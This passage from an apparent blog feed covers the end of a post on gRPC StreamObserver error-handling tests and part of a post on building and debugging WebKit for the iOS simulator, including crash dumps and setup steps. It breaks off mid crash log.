&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;strong&amp;gt;Client Response&amp;lt;&amp;#x2F;strong&amp;gt;&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;code&amp;gt;StatusRuntimeException(&amp;quot;CANCELLED: Cancelled by client with StreamObserver.onError()&amp;quot;)&amp;lt;&amp;#x2F;code&amp;gt;, original exception included as &amp;lt;code&amp;gt;cause&amp;lt;&amp;#x2F;code&amp;gt;.&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;code&amp;gt;StatusRuntimeException(&amp;quot;UNKNOWN&amp;quot;)&amp;lt;&amp;#x2F;code&amp;gt;, &amp;lt;code&amp;gt;cause&amp;lt;&amp;#x2F;code&amp;gt; is &amp;lt;code&amp;gt;null&amp;lt;&amp;#x2F;code&amp;gt;.&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;&amp;#x2F;tr&amp;gt;
&amp;lt;&amp;#x2F;tbody&amp;gt;&amp;lt;&amp;#x2F;table&amp;gt;
&amp;lt;p&amp;gt;(Columns represent the StreamObserver the error was sent on. Rows represent the StreamObserver error was checked on)&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;As you can see - the results are very confusing. Each scenario behaved differently, especially in Server Response &amp;lt;code&amp;gt;StreamObserver&amp;lt;&amp;#x2F;code&amp;gt; object where &amp;lt;code&amp;gt;onError()&amp;lt;&amp;#x2F;code&amp;gt; wasn’t even called when the error was sent from the Server Request object. This proves it is wrong to rely on &amp;lt;code&amp;gt;onError()&amp;lt;&amp;#x2F;code&amp;gt; always being called on both sides when an error is sent.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;The test above showed us when and how &amp;lt;code&amp;gt;onError()&amp;lt;&amp;#x2F;code&amp;gt; is being triggered on listening &amp;lt;code&amp;gt;StreamObserver&amp;lt;&amp;#x2F;code&amp;gt; objects. But what can (and should) you do with a such object after receiving an error? Should you call &amp;lt;code&amp;gt;onCompleted()&amp;lt;&amp;#x2F;code&amp;gt; manually? Should you call &amp;lt;code&amp;gt;onError()&amp;lt;&amp;#x2F;code&amp;gt; on the corresponding side of the &amp;lt;code&amp;gt;StreamObserver&amp;lt;&amp;#x2F;code&amp;gt;?&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;According to &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;grpc.github.io&amp;#x2F;grpc-java&amp;#x2F;javadoc&amp;#x2F;io&amp;#x2F;grpc&amp;#x2F;stub&amp;#x2F;StreamObserver.html&amp;quot;&amp;gt;grpc-java’s StreamObserver documentation&amp;lt;&amp;#x2F;a&amp;gt;, &amp;lt;code&amp;gt;onError()&amp;lt;&amp;#x2F;code&amp;gt; and &amp;lt;code&amp;gt;onCompleted()&amp;lt;&amp;#x2F;code&amp;gt; should only be called once and should be the last methods called on an instance. But does that apply if it was called by gRPC over the network? I performed some tests by calling &amp;lt;code&amp;gt;onNext()&amp;lt;&amp;#x2F;code&amp;gt; and &amp;lt;code&amp;gt;onComplete()&amp;lt;&amp;#x2F;code&amp;gt; after throwing errors. These are the results:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;table&amp;gt;&amp;lt;thead&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;&amp;lt;&amp;#x2F;th&amp;gt;&amp;lt;th&amp;gt;&amp;lt;strong&amp;gt;Client Request&amp;lt;&amp;#x2F;strong&amp;gt;&amp;lt;&amp;#x2F;th&amp;gt;&amp;lt;th&amp;gt;&amp;lt;strong&amp;gt;Server Response&amp;lt;&amp;#x2F;strong&amp;gt;&amp;lt;&amp;#x2F;th&amp;gt;&amp;lt;&amp;#x2F;tr&amp;gt;&amp;lt;&amp;#x2F;thead&amp;gt;&amp;lt;tbody&amp;gt;
&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;strong&amp;gt;Client Request - onNext&amp;lt;&amp;#x2F;strong&amp;gt;&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;code&amp;gt;IllegalStateException&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;td&amp;gt;No exception&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;&amp;#x2F;tr&amp;gt;
&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;strong&amp;gt;Client Request - onCompleted&amp;lt;&amp;#x2F;strong&amp;gt;&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;code&amp;gt;IllegalStateException&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;td&amp;gt;No exception&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;&amp;#x2F;tr&amp;gt;
&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;strong&amp;gt;Server Response - onNext&amp;lt;&amp;#x2F;strong&amp;gt;&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;code&amp;gt;StatusRuntimeException&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;code&amp;gt;IllegalStateException&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;&amp;#x2F;tr&amp;gt;
&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;strong&amp;gt;Server Response - onCompleted&amp;lt;&amp;#x2F;strong&amp;gt;&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;td&amp;gt;No exception&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;code&amp;gt;IllegalStateException&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;&amp;#x2F;tr&amp;gt;
&amp;lt;&amp;#x2F;tbody&amp;gt;&amp;lt;&amp;#x2F;table&amp;gt;
&amp;lt;p&amp;gt;(Columns represent the StreamObserver the error was sent on. Rows represent the message sent after the error)&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Once again there are inconsistencies in how gRPC notifies us on the error. It seems like it’s wrong to use the stream after an error was thrown in any way, but only in some cases an exception is thrown back to the caller of &amp;lt;code&amp;gt;onNext()&amp;lt;&amp;#x2F;code&amp;gt; or &amp;lt;code&amp;gt;onCompleted()&amp;lt;&amp;#x2F;code&amp;gt;. I was bothered to see that calling &amp;lt;code&amp;gt;onNext()&amp;lt;&amp;#x2F;code&amp;gt; and &amp;lt;code&amp;gt;onCompleted()&amp;lt;&amp;#x2F;code&amp;gt; on a Server Response &amp;lt;code&amp;gt;StreamObserver&amp;lt;&amp;#x2F;code&amp;gt; object after receiving an error from Client Request side didn’t result in the same exception.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;In conclusion, based on the tests I performed it appears that:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;Sending errors from the client to the server will always call &amp;lt;code&amp;gt;onError()&amp;lt;&amp;#x2F;code&amp;gt; on all &amp;lt;code&amp;gt;StreamObserver&amp;lt;&amp;#x2F;code&amp;gt; objects, with informative errors. The other way around isn’t as robust.&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;Streams shouldn’t be used after an error was received, not even to call &amp;lt;code&amp;gt;onCompleted()&amp;lt;&amp;#x2F;code&amp;gt;. gRPC sometimes throws exceptions when calling methods on closed streams.&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ul&amp;gt;
&amp;lt;p&amp;gt;The GitHub repository with all of my tests can be found &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;GuyLewin&amp;#x2F;grpc-bidirectional-streaming-error-handling&amp;quot;&amp;gt;here&amp;lt;&amp;#x2F;a&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
</content>
        </entry>
        
    
        
        <entry>
            <title>Debugging WebKit for iOS</title>
            <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2019-03-16-debugging-webkit-for-ios&#x2F;"/>
            <updated>2019-03-16T00:00:00+0000</updated>
            <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2019-03-16-debugging-webkit-for-ios&#x2F;</id>
            <content type="html">&amp;lt;p&amp;gt;I found a &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;bugs.webkit.org&amp;#x2F;show_bug.cgi?id=195537&amp;quot;&amp;gt;bug in WebKit for iOS&amp;lt;&amp;#x2F;a&amp;gt; and wanted to setup a debug environment to find the exact relevant line. This was harder than I thought, so I decided to document the process.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;collect-initial-crash-dump&amp;quot;&amp;gt;Collect Initial Crash Dump&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;I noticed after running the crashing JavaScript code, I got prompted with a &amp;quot;This webpage was reloaded because a problem occurred.&amp;quot; error. I went and checked &amp;lt;em&amp;gt;Settings &amp;amp;gt; Privacy &amp;amp;gt; Analytics &amp;amp;gt; Analytics Data&amp;lt;&amp;#x2F;em&amp;gt; and found a &amp;lt;em&amp;gt;com.apple.WebKit.WebContent&amp;lt;&amp;#x2F;em&amp;gt; entry with the following crash information:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot;&amp;gt;&amp;lt;code&amp;gt;&amp;lt;span&amp;gt;...
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Exception Type:  EXC_BAD_ACCESS (SIGSEGV)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Exception Subtype: KERN_INVALID_ADDRESS at 0x0000000000000000
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;VM Region Info: 0 is not in any region.  Bytes before following region: 4372119552
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;      REGION TYPE                      START - END             [ VSIZE] PRT&amp;#x2F;MAX SHRMOD  REGION DETAIL
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;      UNUSED SPACE AT START
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;---&amp;amp;gt;  
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;      __TEXT                 0000000104994000-0000000104998000 [   16K] r-x&amp;#x2F;r-x SM=COW  ...it.WebContent
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Termination Signal: Segmentation fault: 11
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Termination Reason: Namespace SIGNAL, Code 0xb
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Terminating Process: exc handler [30816]
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Triggered by Thread:  0
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Thread 0 name:  Dispatch queue: com.apple.main-thread
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Thread 0 Crashed:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;0   WebCore                       	0x00000001b0225e78 0x1aef42000 + 19807864
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;1   WebCore                       	0x00000001af51f158 0x1aef42000 + 6148440
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;2   WebCore                       	0x00000001b039bcf8 0x1aef42000 + 21339384
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;3   WebCore                       	0x00000001b0322a50 0x1aef42000 + 20843088
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;4   WebCore                       	0x00000001b03927c4 0x1aef42000 + 21301188
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;5   WebCore                       	0x00000001b03099cc 0x1aef42000 + 20740556
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;6   WebCore                       	0x00000001b0310034 0x1aef42000 + 20766772
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;7   WebCore                       	0x00000001b048e35c 0x1aef42000 + 22332252
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;8   WebCore                       	0x00000001b040d8ec 0x1aef42000 + 21805292
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;9   WebCore                       	0x00000001b032325c 0x1aef42000 + 20845148
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;10  WebCore                       	0x00000001b0322a50 0x1aef42000 + 20843088
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;11  WebCore                       	0x00000001b0322f28 0x1aef42000 + 20844328
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;12  WebCore                       	0x00000001b0322bdc 0x1aef42000 + 20843484
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;13  WebCore                       	0x00000001b0323294 0x1aef42000 + 20845204
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;14  WebCore                       	0x00000001b0322a50 0x1aef42000 + 20843088
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;15  WebCore                       	0x00000001b0322f28 0x1aef42000 + 20844328
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;16  WebCore                       	0x00000001b0322bdc 0x1aef42000 + 20843484
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;17  WebCore                       	0x00000001b0323294 0x1aef42000 + 20845204
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;18  WebCore                       	0x00000001b0322a50 0x1aef42000 + 20843088
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;19  WebCore                       	0x00000001b03e6e0c 0x1aef42000 + 21646860
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;20  WebCore                       	0x00000001b03e4944 0x1aef42000 + 21637444
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;21  WebCore                       	0x00000001b03e202c 0x1aef42000 + 21626924
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;22  WebCore                       	0x00000001b03e1ff4 0x1aef42000 + 21626868
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;23  WebCore                       	0x00000001b03dfe84 0x1aef42000 + 21618308
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;24  WebCore                       	0x00000001b00bb610 0x1aef42000 + 18322960
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;25  WebCore                       	0x00000001b015b8e8 0x1aef42000 + 18979048
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;26  WebCore                       	0x00000001b00bb354 0x1aef42000 + 18322260
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;27  WebKit                        	0x00000001b629b134 0x1b6135000 + 1466676
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;28  WebKit                        	0x00000001b629c814 0x1b6135000 + 1472532
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;29  WebKit                        	0x00000001b61f1430 0x1b6135000 + 771120
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;30  WebCore                       	0x00000001b016734c 0x1aef42000 + 19026764
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;31  WebCore                       	0x00000001b0150c5c 0x1aef42000 + 18934876
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;32  WebCore                       	0x00000001b01ab680 0x1aef42000 + 19306112
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;33  CoreFoundation                	0x00000001a63e0b80 0x1a6330000 + 723840
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;34  CoreFoundation                	0x00000001a63e08ac 0x1a6330000 + 723116
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;35  CoreFoundation                	0x00000001a63e0090 0x1a6330000 + 721040
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;36  CoreFoundation                	0x00000001a63dad28 0x1a6330000 + 699688
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;37  CoreFoundation                	0x00000001a63da2e8 0x1a6330000 + 697064
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;38  Foundation                    	0x00000001a6dde3e0 0x1a6dd6000 + 33760
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;39  Foundation                    	0x00000001a6e1b1cc 0x1a6dd6000 + 283084
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;40  libxpc.dylib                  	0x00000001a6099d10 0x1a6085000 + 85264
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;41  libxpc.dylib                  	0x00000001a609c7a8 0x1a6085000 + 96168
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;42  com.apple.WebKit.WebContent   	0x00000001049976b4 0x104994000 + 14004
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;43  libdyld.dylib                 	0x00000001a5e8d050 0x1a5e8c000 + 4176
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;...
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;It’s clear that this is a null dereference scenario, but finding the bug in the code out of this dump would be a nightmare. So I decided to setup my WebKit for iOS environment.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;system-prerequisites&amp;quot;&amp;gt;System Prerequisites&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;You have to have:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;Recent Xcode with iPhone SDK&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;&amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.macworld.co.uk&amp;#x2F;how-to&amp;#x2F;mac&amp;#x2F;how-turn-off-mac-os-x-system-integrity-protection-rootless-3638975&amp;#x2F;&amp;quot;&amp;gt;Disable SIP&amp;lt;&amp;#x2F;a&amp;gt;!
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;I couldn’t tell you how much time I wasted on this one. It was unclear to me that SIP on the Mac host machine would affect attaching to Safari &amp;#x2F; WebKit &amp;lt;strong&amp;gt;inside&amp;lt;&amp;#x2F;strong&amp;gt; the iPhone simulator. Before disabling SIP I kept getting &amp;lt;em&amp;gt;error: attach failed: unable to attach&amp;lt;&amp;#x2F;em&amp;gt; from lldb, and &amp;lt;em&amp;gt;Could not attach to pid (unable to attach)&amp;lt;&amp;#x2F;em&amp;gt; trying to attach from Xcode. &amp;lt;strong&amp;gt;Disable SIP solved the debugger attaching errors&amp;lt;&amp;#x2F;strong&amp;gt;&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ul&amp;gt;
&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ul&amp;gt;
&amp;lt;h2 id=&amp;quot;get-the-code&amp;quot;&amp;gt;Get the Code&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;Generally just follow &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;webkit.org&amp;#x2F;getting-the-code&amp;#x2F;&amp;quot;&amp;gt;the Webkit guide for getting the code&amp;lt;&amp;#x2F;a&amp;gt;. All you have to run is:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;svn checkout https:&amp;#x2F;&amp;#x2F;svn.webkit.org&amp;#x2F;repository&amp;#x2F;webkit&amp;#x2F;trunk WebKit
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;This will checkout the up-to-date code version, which is probably not very stable. Try updating it once in a while if it’s not stable until you reach a stable enough version using the SVN update command from within the WebKit directory:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;svn up
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;h2 id=&amp;quot;compiling-running-webkit-for-ios&amp;quot;&amp;gt;Compiling + Running WebKit for iOS&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;All iOS browsers (including Safari, Chrome, Opera, Firefox..) must use the pre-installed iOS WebKit version to get approved into the App Store. The browser used for debugging the WebKit engine on iOS is Safari and there are automated scripts ready to compile and launch everything for you. Simply follow &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;webkit.org&amp;#x2F;blog&amp;#x2F;3457&amp;#x2F;building-webkit-for-ios-simulator&amp;#x2F;&amp;quot;&amp;gt;this guide&amp;lt;&amp;#x2F;a&amp;gt; from the WebKit blog. (Be sure to pass &amp;lt;code&amp;gt;--ios-simulator --debug&amp;lt;&amp;#x2F;code&amp;gt; to every WebKit script you are running)&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;better-crash-logs&amp;quot;&amp;gt;Better Crash Logs&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;Now that you have a running Safari with debug symbols - reproduce the crash. If you manage to get the browser to crash with the &amp;quot;This webpage was reloaded because a problem occurred.&amp;quot; message - look at the &amp;lt;code&amp;gt;~&amp;#x2F;Library&amp;#x2F;Logs&amp;#x2F;DiagnosticReports&amp;#x2F;&amp;lt;&amp;#x2F;code&amp;gt; directory on your Mac and check if a log was recently created. It’s file name should end with your Mac’s name and not with the iPhone, which could be a bit confusing. Open the crash dump and you should be able to read it much clearly:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot;&amp;gt;&amp;lt;code&amp;gt;&amp;lt;span&amp;gt;...
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Exception Type:        EXC_BAD_ACCESS (SIGSEGV)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Exception Codes:       KERN_INVALID_ADDRESS at 0x0000000000000000
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Exception Note:        EXC_CORPSE_NOTIFY
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Termination Signal:    Segmentation fault: 11
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Termination Reason:    Namespace SIGNAL, Code 0xb
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Terminating Process:   exc handler [64527]
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;VM Regions Near 0:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;--&amp;amp;gt; 
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    __TEXT                 0000000108332000-0000000108334000 [    8K] r-x&amp;#x2F;rwx SM=COW  &amp;#x2F;Applications&amp;#x2F;Xcode.app&amp;#x2F;Contents&amp;#x2F;Developer&amp;#x2F;Platforms&amp;#x2F;iPhoneOS.platform&amp;#x2F;Developer&amp;#x2F;Library&amp;#x2F;CoreSimulator&amp;#x2F;Profiles&amp;#x2F;Runtimes&amp;#x2F;iOS.simruntime&amp;#x2F;Contents&amp;#x2F;Resources&amp;#x2F;RuntimeRoot&amp;#x2F;System&amp;#x2F;Library&amp;#x2F;Frameworks&amp;#x2F;WebKit.framework&amp;#x2F;XPCServices&amp;#x2F;com.apple.WebKit.WebContent.xpc&amp;#x2F;com.apple.WebKit.WebContent
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Application Specific Information:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;CoreSimulator 581.2 - Device: iPhone SE For WebKit Development - Runtime: iOS 12.1 (16B91) - DeviceType: iPhone SE
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Thread 0 Crashed:: Dispatch queue: com.apple.main-thread
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;0   com.apple.WebCore             	0x000000026a32c1f7 WebCore::GraphicsContext::platformContext() const + 7
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;1   com.apple.WebCore             	0x00000002695ff2fc WebCore::RenderThemeIOS::paintFileUploadIconDecorations(WebCore::RenderObject const&amp;amp;amp;, WebCore::RenderObject const&amp;amp;amp;, WebCore::PaintInfo const&amp;amp;amp;, WebCore::IntRect const&amp;amp;amp;, WebCore::Icon*, WebCore::RenderTheme::FileUploadDecorations) + 524
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;2   com.apple.WebCore             	0x000000026a4b323f WebCore::RenderFileUploadControl::paintObject(WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;) + 2671
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;3   com.apple.WebCore             	0x000000026a4343af WebCore::RenderBlock::paint(WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;) + 271
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;4   com.apple.WebCore             	0x000000026a4a9082 WebCore::RenderElement::paintAsInlineBlock(WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;) + 162
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;5   com.apple.WebCore             	0x000000026a41a687 WebCore::InlineElementBox::paint(WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;, WebCore::LayoutUnit, WebCore::LayoutUnit) + 119
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;6   com.apple.WebCore             	0x000000026a420cf0 WebCore::InlineFlowBox::paint(WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;, WebCore::LayoutUnit, WebCore::LayoutUnit) + 1056
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;7   com.apple.WebCore             	0x000000026a5ac9e2 WebCore::RootInlineBox::paint(WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;, WebCore::LayoutUnit, WebCore::LayoutUnit) + 34
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;8   com.apple.WebCore             	0x000000026a52a122 WebCore::RenderLineBoxList::paint(WebCore::RenderBoxModelObject*, WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;) const + 994
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;9   com.apple.WebCore             	0x000000026a434b97 WebCore::RenderBlock::paintObject(WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;) + 695
